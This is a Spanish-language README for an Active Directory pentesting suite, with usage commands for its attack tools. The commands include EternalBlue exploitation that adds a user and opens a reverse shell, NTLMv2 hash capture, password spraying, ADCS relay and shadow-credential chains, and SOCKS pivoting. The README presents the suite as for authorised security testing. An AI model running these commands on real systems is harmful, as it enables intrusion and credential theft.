<p align="center">
  <img src="docs/lobera_logo.png" alt="Lobera logo" width="220"/>
</p>

<h1 align="center">Lobera</h1>

<p align="center">
  <strong>Suite modular de pentesting para Active Directory</strong><br/>
  Construida sobre <code>impacket</code> — entiendes los protocolos, no solo las herramientas.
</p>

<p align="center">
  <img src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"/>
  <img src="https://img.shields.io/badge/protocolos-SMB%20·%20Kerberos%20·%20LDAP%20·%20RPC%20·%20WinRM%20·%20SSH%20·%20SSL%20·%20HTTP%20·%20FTP%20·%20MSSQL-red?style=flat-square"/>
  <img src="https://img.shields.io/badge/estado-activo-green?style=flat-square"/>
  <img src="https://img.shields.io/badge/autor-mitr0kerb-cyan?style=flat-square"/>
</p>

---

> ⚠️ **Beta** — muchos scripts están en desarrollo activo. Problemas: 📧 mitr0kerb@gmail.com

---

## ¿Qué es Lobera?

Lobera es una suite modular para enumerar y atacar entornos Active Directory. Cada protocolo está implementado directamente sobre `impacket` — sin wrappers, sin magia negra. El objetivo es entender qué paquete va a qué puerto y por qué.

No es un clon de CrackMapExec. Cada llamada mapea a una operación real de protocolo.

---

## Instalación

```bash
git clone git@github.com:mitr0kerb/Lobera.git
cd Lobera
pip install -e . --break-system-packages
```

Esto instala tanto el CLI principal (`lobera`) como todas las herramientas de la suite.

**Requisitos:** Python 3.10+, impacket, rich, pyfiglet, pycryptodomex, pyasn1, pywinrm, ldap3, paramiko.

---

## La suite — herramientas independientes

Además del CLI principal, Lobera incluye cuatro herramientas autónomas instaladas como comandos del sistema:

| Herramienta | Descripción |
|---|---|
| `lobera-server` | Servidor SMB falso (captura NTLMv2) + HTTP para servir payloads |
| `lobera-watch` | Monitor de eventos AD en tiempo real vía LDAP |
| `lobera-spray` | Sprayer multiprotocolo con medidas anti-lockout |
| `lobera-tunnel` | Proxy SOCKS5 y reenvío de puertos sobre SSH para pivoting |
| `lobera-check`  | Checker y exploit de vulnerabilidades conocidas (MS17-010 / EternalBlue) |

Cada herramienta muestra su menú completo con ejemplos al ejecutarla sin argumentos.

### lobera-server

```bash
# Capturar hashes NTLMv2 — apunta víctimas a \\TU_IP\share
lobera-server smb --ip 0.0.0.0 --port 445 --output hashes.txt

# Servir payloads por HTTP
lobera-server http --ip 0.0.0.0 --port 8080 --dir /tmp/payloads

# Ambos simultáneos
lobera-server both --smb-port 8445 --http-port 8080 --output hashes.txt
```

### lobera-watch

```bash
# Monitorizar todo con intervalo de 30 segundos
lobera-watch -t 10.10.10.5 -u auditor -p 'P@ss' -d CORP.LOCAL --interval 30

# Solo cambios en grupos privilegiados, con log
lobera-watch -t 10.10.10.5 -u auditor -p 'P@ss' -d CORP.LOCAL --filter groups --output eventos.log

# Pass-the-hash
lobera-watch -t 10.10.10.5 -u admin -H :aad3b435b51404eeaad3b435b51404ee -d CORP.LOCAL
```

Detecta: nuevos usuarios · cambios de contraseña · lockouts · cambios en DA/EA/Admins · nuevos equipos · GPOs modificadas · SPNs añadidos · delegaciones.

### lobera-spray

```bash
# SMB con lista de usuarios y contraseñas
lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 2

# WinRM — un usuario, varias contraseñas
lobera-spray winrm -t 10.10.10.5 -u admin -P top100.txt -d CORP.LOCAL

# LDAP con pausa entre rondas (anti-lockout estricto)
lobera-spray ldap -t 10.10.10.5 -U users.txt -P passes.txt -d CORP.LOCAL --rounds 1 --pause 1800

# Todos los protocolos de una vez
lobera-spray all -t 10.10.10.5 -u admin -p 'Winter2024!' -d CORP.LOCAL
```

Protocolos: `smb` · `winrm` · `ssh` · `ldap` · `all`. Flags de anti-lockout: `--delay`, `--jitter`, `--rounds`, `--pause`.

### lobera-tunnel

```bash
# Proxy SOCKS5 — usa con proxychains
lobera-tunnel socks5 -t 10.10.10.5 -u user -p 'P@ss' --local-port 1080
proxychains nmap -sV 192.168.1.0/24

# Acceder a RDP interno desde tu máquina
lobera-tunnel forward -t PIVOT -u user -p 'P@ss' --local-port 13389 --remote-host 192.168.1.10 --remote-port 3389

# Recibir shell reversa del objetivo
lobera-tunnel reverse -t PIVOT -u user -p 'P@ss' --remote-port 4444 --local-port 4444

# Varios túneles desde YAML
lobera-tunnel multi -t PIVOT -u user -p 'P@ss' --config tunnels.yaml
```

### lobera-check

```bash
# Comprobar si un host es vulnerable a EternalBlue
lobera-check ms17010 check -t 192.168.1.10

# Ejecutar un comando como SYSTEM
lobera-check ms17010 exploit -t 192.168.1.10 --payload cmd --cmd "net user hacker P@ss1234 /add"

# Reverse shell PowerShell
lobera-check ms17010 exploit -t 192.168.1.10 --payload shell --lhost 192.168.1.5 --lport 4444

# Escanear un rango completo
for ip in 192.168.1.{1..254}; do lobera-check ms17010 check -t $ip 2>/dev/null; done
```

---

## CLI principal — tres modos de uso

### 1. Modo clásico

```bash
# Ver todos los scripts de un protocolo
lobera smb

# Ejecutar un script
lobera smb --script=shares -t 10.10.10.5 -u iker -p Pass123!

# Ejecutar una familia entera
lobera ldap --script-fam=enum -t 10.10.10.5 -d CORP.LOCAL -u iker -p Pass123!

# Simular sin ejecutar nada
lobera smb --script=shares -t 10.10.10.5 -u iker -p Pass123! --dry-run
```

### 2. Shell interactivo

```bash
lobera smb --interactive-shell
lobera kerberos --interactive-shell
```

```
smb-shell > load shares
smb-shell(shares) > set target 10.10.10.5
smb-shell(shares) > set user iker
smb-shell(shares) > run
smb-shell(shares) > load gpp-password
smb-shell(shares) > run    ← reutiliza target/user
```

### 3. Scanner autopwn

```bash
lobera smb --scanner
lobera ldap --scanner
lobera kerberos --scanner
```

---

## Scripts disponibles

### SMB (445)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `null-session` | Sesión nula — acceso sin credenciales |
| enum | `shares` | Enumera shares y permisos |
| enum | `users` | Enumera usuarios |
| enum | `groups` | Enumera grupos |
| enum | `sessions` | Sesiones activas |
| enum | `loggedon` | Usuarios con sesión abierta |
| enum | `os-info` | Versión del SO y arquitectura |
| enum | `policy` | Política de contraseñas |
| enum | `signing` | Comprueba si SMB signing es obligatorio |
| enum | `gpp-password` | Busca contraseñas en GPP/SYSVOL |
| enum | `spider` | Recorre shares buscando ficheros interesantes |
| enum | `disks` | Enumera discos del sistema |
| enum | `auth` | Prueba autenticación con las credenciales dadas |
| enum | `analysis` | Análisis general del host SMB |
| attack | `password-spray` | Spray de contraseñas contra SMB |
| attack | `pass-the-ticket` | Autenticación con .ccache de Kerberos |
| attack | `exec` | Ejecución remota de comandos |
| attack | `sam-dump` | Vuelca la SAM (requiere admin) |
| attack | `ntlm-relay` | Configura y ejecuta relay NTLM |
| attack | `delegation-check` | Detecta cuentas con delegación |
| attack | `put` | Sube un fichero a un share |
| exploit | `zerologon` | CVE-2020-1472 — ZeroLogon |
| exploit | `printnightmare` | CVE-2021-1675 — PrintNightmare |
| exploit | `petitpotam` | Coerción NTLM vía MS-EFSRPC |
| exploit | `ms08-067` | CVE-2008-4250 — MS08-067 |
| post | `reg-dump` | Vuelca claves del registro |
| post | `service-list` | Lista servicios del sistema |
| post | `task-list` | Lista tareas programadas |

### Kerberos (88)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `user-enum` | Enumera usuarios válidos (AS-REQ sin preauth) |
| enum | `spn-scan` | Enumera SPNs registrados |
| extraction | `asrep-roasting` | AS-REP Roasting — hashes de cuentas sin preauth |
| extraction | `kerberoasting` | Kerberoasting — hashes de cuentas con SPN |
| tickets | `overpass-the-hash` | NT hash → TGT (.ccache) |
| tickets | `pass-the-ticket` | Autenticación con .ccache |
| tickets | `golden-ticket` | Golden Ticket (requiere hash de krbtgt) |
| tickets | `silver-ticket` | Silver Ticket (requiere hash de cuenta de servicio) |
| tickets | `diamond-ticket` | Diamond Ticket — variante sigilosa del Golden |
| tickets | `sapphire-ticket` | Sapphire Ticket — basado en PKINIT |
| delegation | `unconstrained` | Detecta delegación no restringida |
| delegation | `constrained-s4u` | Detecta delegación restringida + S4U2Proxy |
| delegation | `rbcd` | Resource-Based Constrained Delegation |
| credentials | `adcs` | Obtiene credenciales vía ADCS/PKINIT |
| credentials | `pkinit` | Autenticación Kerberos con certificado |
| credentials | `shadow-credentials` | Shadow Credentials vía Kerberos |
| exploits | `ms14-068` | CVE-2014-6324 — escalada de privilegios Kerberos |
| exploits | `sam-spoofing` | sAMAccountName spoofing (noPac) |
| exploits | `reset-nightmare` | Abuso de reset de contraseña Kerberos |
| exploits | `kerber-loss` | Explotación de debilidades en cifrado Kerberos |

### LDAP (389/636)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `domain-info` | Info general del dominio (nivel funcional, política de contraseñas) |
| enum | `users` | Enumera usuarios con flags UAC |
| enum | `groups` | Enumera grupos y miembros |
| enum | `admins` | Enumera grupos privilegiados (DA, EA, BA...) |
| enum | `computers` | Enumera equipos del dominio |
| enum | `dacl-enum` | ACEs peligrosas (WriteDACL, GenericAll, GenericWrite...) |
| enum | `password-policy` | Política de contraseñas del dominio |
| enum | `kerberoast-targets` | Usuarios con SPN (objetivo de Kerberoasting) |
| enum | `asreproast-targets` | Usuarios sin preauth (objetivo de AS-REP Roasting) |
| enum | `bloodhound-lite` | Enumeración completa en un solo paso + rutas de ataque |
| adcs | `enum-templates` | Detecta plantillas ADCS vulnerables (ESC1-ESC8) |
| adcs | `request-cert` | Solicita certificado con SAN arbitrario (ESC1) → .pfx |
| attack | `acl-abuse` | Abuso de ACLs (WriteDACL, GenericAll...) |
| attack | `bloodhound-export` | Exporta datos para BloodHound |
| exploits | `password-spray-ldap` | Spray de contraseñas contra LDAP |
| exploits | `shadow-creds` | Escribe msDS-KeyCredentialLink → TGT sin cambiar contraseña |
| exploits | `ntlm-relay-setup` | Verifica prerequisitos y genera comandos para NTLM Relay |

### RPC (135)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `domain-info` | Info del dominio vía RPC |
| enum | `users` | Enumera usuarios vía MS-SAMR |
| enum | `groups` | Enumera grupos vía RPC |
| enum | `sessions` | Sesiones activas vía MS-SRVS |
| enum | `services` | Servicios del sistema vía MS-SCMR |
| enum | `privileges` | Privilegios de cuentas |
| enum | `registry` | Acceso al registro vía MS-RRP |
| attack | `coerce` | PetitPotam / PrinterBug / DFSCoerce — fuerza autenticación NTLM |
| attack | `exec-service` | Ejecución remota vía creación de servicio |
| attack | `rid-brute` | Enumeración de usuarios por RID brute force |
| exploits | `petitpotam` | MS-EFSRPC coerción (versión standalone) |
| exploits | `printnightmare` | CVE-2021-1675 vía MS-RPRN |
| exploits | `sam-dump` | Vuelca SAM/SYSTEM vía MS-RRP |

### WinRM (5985/5986)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `check` | Comprueba si WinRM está activo y accesible |
| enum | `sysinfo` | Información del sistema vía WinRM |
| attack | `password-spray` | Spray de contraseñas contra WinRM |
| exploits | `evil-winrm-payload` | Shell interactiva vía WinRM |
| exploits | `privesc-check` | Comprobaciones de escalada de privilegios |

### SSH (22)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `banner-grab` | Banner del servidor SSH |
| enum | `auth-methods` | Métodos de autenticación permitidos |
| enum | `host-key-fingerprint` | Fingerprint de la clave del host |
| enum | `key-exchange-enum` | Algoritmos de intercambio de claves |
| enum | `user-enum` | Enumeración de usuarios válidos |
| enum | `terrapin-check` | Detección de vulnerabilidad Terrapin (CVE-2023-48795) |
| attack | `password-spray` | Spray de contraseñas contra SSH |
| attack | `brute-force` | Fuerza bruta SSH |
| attack | `key-auth-test` | Prueba autenticación con clave privada |
| attack | `known-keys` | Prueba claves privadas conocidas/débiles |
| exploits | `regresshion` | CVE-2024-6387 — regreSSHion |
| exploits | `terrapin-exploit` | Explotación de Terrapin |
| exploits | `libssh-bypass` | CVE-2018-10933 — bypass de autenticación libssh |
| post | `config-dump` | Vuelca configuración del servidor |
| post | `key-harvest` | Recolecta claves SSH del sistema |
| post | `lateral-move` | Movimiento lateral vía SSH |
| post | `persistence` | Mecanismos de persistencia vía SSH |

### SSL/TLS (443+)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `cert-info` | Información del certificado |
| enum | `cipher-enum` | Enumeración de cifrados soportados |
| enum | `protocol-version` | Versiones TLS soportadas (SSLv3, TLS 1.0...) |
| enum | `san-enum` | Subject Alternative Names del certificado |
| enum | `hsts-check` | Comprueba HSTS y otras cabeceras de seguridad |
| enum | `ocsp-check` | Estado de revocación OCSP |
| enum | `ct-log-search` | Búsqueda en Certificate Transparency logs |
| attack | `heartbleed` | CVE-2014-0160 — Heartbleed |
| attack | `poodle` | CVE-2014-3566 — POODLE |
| exploits | `tls-poison` | TLS poison / BEAST |
| exploits | `alpn-confusion` | ALPN confusion attacks |
| exploits | `cert-spoof-check` | Detección de posibilidad de spoofing de certificado |
| exploits | `openssl-cve-2022-0778` | CVE-2022-0778 — loop infinito en OpenSSL |

### HTTP (80)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `banner-grab` | Banner y cabeceras del servidor |
| enum | `tech-detect` | Detección de tecnologías (servidor, framework, CMS) |
| enum | `robots-sitemap` | Lectura de robots.txt y sitemap.xml |
| enum | `cors-check` | Comprueba configuración CORS |
| enum | `js-secrets` | Busca secretos en ficheros JavaScript |
| enum | `http2-check` | Soporte HTTP/2 |
| enum | `ssl-redirect` | Comprueba redirección HTTP → HTTPS |
| attack | `sqli-detect` | Detección de SQL Injection |
| attack | `xss-detect` | Detección de XSS |
| attack | `lfi-detect` | Detección de Local File Inclusion |
| attack | `ssrf-detect` | Detección de SSRF |
| attack | `open-redirect` | Detección de Open Redirect |
| attack | `header-injection` | Inyección de cabeceras HTTP |
| attack | `jwt-attack` | Ataques sobre JWT (alg:none, weak secret...) |
| attack | `graphql-enum` | Enumeración de esquema GraphQL |
| exploit | `log4shell` | CVE-2021-44228 — Log4Shell |
| exploit | `shellshock` | CVE-2014-6271 — Shellshock |
| exploit | `php-cgi-rce` | CVE-2012-1823 — PHP CGI RCE |
| exploit | `apache-path-traversal` | Path traversal en Apache |
| exploit | `http-request-smuggling` | HTTP Request Smuggling |
| post | `crawl` | Rastreo de la aplicación web |
| post | `extract-links` | Extracción de enlaces y recursos |

### HTTPS (443)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `banner-grab` | Banner y cabeceras |
| enum | `tech-detect` | Detección de tecnologías |
| enum | `robots-sitemap` | robots.txt y sitemap.xml |
| enum | `cors-check` | Configuración CORS |
| enum | `js-secrets` | Secretos en JavaScript |
| enum | `security-headers` | Cabeceras de seguridad (CSP, HSTS, X-Frame...) |
| enum | `certificate-pinning` | Detección de certificate pinning |
| enum | `dir-bruteforce` | Fuerza bruta de directorios |
| attack | `sqli-detect` | SQL Injection |
| attack | `xss-detect` | XSS |
| attack | `lfi-detect` | Local File Inclusion |
| attack | `ssrf-detect` | SSRF |
| attack | `jwt-attack` | Ataques JWT |
| attack | `oauth-misconfig` | Detección de misconfiguraciones OAuth |
| attack | `cache-poisoning` | Web Cache Poisoning |
| exploit | `log4shell` | CVE-2021-44228 |
| exploit | `spring4shell` | CVE-2022-22965 — Spring4Shell |
| exploit | `jenkins-file-read` | Lectura arbitraria de ficheros en Jenkins |
| exploit | `php-cgi-rce` | PHP CGI RCE |
| exploit | `tls-stripping` | TLS Stripping |
| post | `crawl` | Rastreo web |
| post | `extract-links` | Extracción de enlaces |

### FTP (21)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `anon-check` | Acceso anónimo FTP |
| enum | `banner-grab` | Banner del servidor |
| enum | `service-info` | Información del servicio |
| enum | `list-files` | Lista ficheros accesibles |
| enum | `user-enum` | Enumeración de usuarios |
| attack | `password-spray` | Spray de contraseñas |
| attack | `brute-force` | Fuerza bruta FTP |
| attack | `write-check` | Comprueba permisos de escritura |
| attack | `bounce-scan` | FTP Bounce Scan |
| exploit | `vsftpd-backdoor` | CVE-2011-2523 — backdoor vsftpd 2.3.4 |
| exploit | `proftpd-bypass` | Bypass de autenticación ProFTPD |
| exploit | `anonymous-webshell` | Webshell vía acceso anónimo FTP |
| exploit | `ssl-strip` | SSL Strip en FTP |
| post | `download-loot` | Descarga ficheros de interés |
| post | `pivot-setup` | Configura pivoting vía FTP |

### MSSQL (1433)

| Familia | Script | Descripción |
|---------|--------|-------------|
| enum | `instance-enum` | Enumera instancias MSSQL |
| enum | `version-enum` | Versión del servidor |
| enum | `auth-check` | Comprueba modos de autenticación |
| enum | `user-enum` | Enumera usuarios de la base de datos |
| enum | `db-enum` | Enumera bases de datos |
| enum | `linked-servers` | Enumera servidores enlazados |
| enum | `privs-check` | Comprueba privilegios del usuario actual |
| attack | `password-spray` | Spray de contraseñas |
| attack | `xp-cmdshell` | Ejecución de comandos vía xp_cmdshell |
| attack | `ntlm-steal` | Robo de hash NTLM vía UNC path |
| exploit | `xp-cmdshell-enable` | Habilita xp_cmdshell si está desactivado |
| exploit | `linked-exec` | Ejecución en servidor enlazado |
| exploit | `clr-exec` | Ejecución de código .NET vía CLR |
| exploit | `agent-job` | Ejecución vía SQL Server Agent Job |
| post | `custom-query` | Ejecuta una query personalizada |
| post | `dump-hashes` | Vuelca hashes de usuarios |
| post | `read-file` | Lee ficheros del sistema vía MSSQL |

---

## Flujos de ataque habituales

### Kerberoasting → crackeo offline
```bash
lobera kerberos --script=kerberoasting -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
hashcat -m 13100 hashes.txt rockyou.txt
```

### ESC1 — Certificado como Administrador
```bash
# 1. Buscar plantilla vulnerable
lobera ldap --script=enum-templates -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL

# 2. Solicitar certificado como Administrator
lobera ldap --script=request-cert -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
  --template VulnTemplate --upn administrator@corp.local --ca CORP-CA

# 3. Obtener TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
```

### Coerción + NTLM Relay → ADCS (ESC8)
```bash
# Terminal 1: relay hacia ADCS
lobera ldap --script=ntlm-relay-setup -t 10.10.10.5 -d CORP.LOCAL \
  --mode adcs --ca CORP-CA --attacker-ip 10.10.14.1

# Terminal 2: coercionar al DC con lobera-server
lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes.txt
# o directamente desde el CLI
lobera rpc --script=coerce -t 10.10.10.5 --listener 10.10.14.1

# → cert.pfx como DC$ → DCSync
certipy auth -pfx dc.pfx -dc-ip 10.10.10.5
```

### Spray + relay NTLM
```bash
# 1. Spray para encontrar credenciales
lobera-spray smb -t 10.10.10.5 -U users.txt -P passwords.txt -d CORP.LOCAL --delay 5

# 2. Con credenciales: capturar más hashes internos
lobera-server smb --ip 0.0.0.0 --port 8445 --output hashes_internos.txt
```

### Shadow Credentials → TGT sin cambiar contraseña
```bash
lobera ldap --script=shadow-creds -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL \
  --target-user victima
certipy auth -pfx victima.pfx -dc-ip 10.10.10.5
# Limpiar rastro
lobera ldap --script=shadow-creds ... --target-user victima --clear
```

### Pivoting desde un host comprometido
```bash
# 1. Túnel SOCKS5 a través del host comprometido
lobera-tunnel socks5 -t PIVOT_IP -u user -p 'P@ss' --local-port 1080

# 2. Atacar red interna con proxychains
proxychains lobera ldap --script=users -t 192.168.1.5 -u iker -p Pass123! -d INT.LOCAL
proxychains lobera-spray smb -t 192.168.1.0/24 -u admin -p 'Pass!' -d INT.LOCAL

# 3. Monitorizar cambios en el DC interno
proxychains lobera-watch -t 192.168.1.1 -u auditor -p 'P@ss' -d INT.LOCAL
```

### BloodHound lite — mapa de ataque rápido
```bash
lobera ldap --script=bloodhound-lite -t 10.10.10.5 -u iker -p Pass123! -d CORP.LOCAL
# → rutas críticas ordenadas por severidad sin levantar BloodHound
```

---

## Base de datos de sesión

Todos los hallazgos, credenciales y objetivos se guardan automáticamente en `lobera.db`.

```bash
lobera db targets
lobera db findings -t 10.10.10.5
lobera db creds -t 10.10.10.5
lobera db creds -t 10.10.10.5 --show-secret
lobera db delete -t 10.10.10.5
```

---

## Autocompletado

```bash
# Bash
source tools/completions/lobera_completion.bash

# Zsh
source tools/completions/lobera_completion.zsh
```

---

## Añadir scripts propios

Crea un fichero en `scripts/<protocolo>/<familia>/mi_script.py` y Lobera lo descubre automáticamente. Ver [`docs/como_añadir_scripts.md`](docs/como_añadir_scripts.md) para la plantilla completa.

---

## Plataformas

- Linux (Kali, Parrot) — principal
- macOS (Apple Silicon) — probado
- Windows — sin probar

---

## Aviso legal

Lobera es un proyecto personal educativo. Úsalo únicamente en sistemas propios o con permiso explícito por escrito. El uso no autorizado contra sistemas de terceros es ilegal.

---

**mitr0kerb** — construido como inmersión práctica en los protocolos de Active Directory.
Contacto: 📧 mitr0kerb@gmail.com
